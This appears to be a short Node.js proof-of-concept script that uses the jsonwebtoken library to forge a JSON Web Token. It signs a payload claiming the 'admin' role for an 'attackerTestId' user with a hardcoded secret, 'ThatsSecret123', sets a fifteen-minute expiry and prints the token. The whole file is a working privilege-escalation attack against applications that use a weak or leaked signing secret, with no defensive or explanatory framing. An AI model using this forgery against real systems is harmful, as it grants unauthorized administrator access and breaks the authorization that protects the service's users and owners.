const jwt = require('jsonwebtoken');

const forged = jwt.sign(
  { id: "attackerTestId", role: "admin" },
  "ThatsSecret123",
  { expiresIn: '15m' }
);

console.log(forged);